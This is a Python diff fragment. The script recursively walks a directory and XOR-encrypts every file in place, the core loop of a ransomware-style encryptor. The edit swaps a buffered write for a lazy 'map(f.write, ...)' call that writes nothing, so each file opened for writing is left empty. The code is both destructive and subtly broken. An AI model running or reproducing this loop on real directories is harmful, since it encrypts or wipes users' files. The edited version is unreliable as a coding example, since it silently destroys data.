@@ -27,13 +27,11 @@ for root, dirs, files in os.walk(rep, topdown=False):
    for name in files:
         link = os.path.join(root, name)
         sizeFile = os.path.getsize(link)
-        bytesToWrite = bytes()
         with open(link,"rb") as f:
             content = f.read()
             content = chunkString(content,key,sizeKey)
             cryptedContent = list(map(byte_xor,content))
-            bytesToWrite = concatList(cryptedContent)
         f.close()
         with open(link,"wb") as f:
-            f.write(bytesToWrite)
+            map(f.write,cryptedContent)
         f.close()
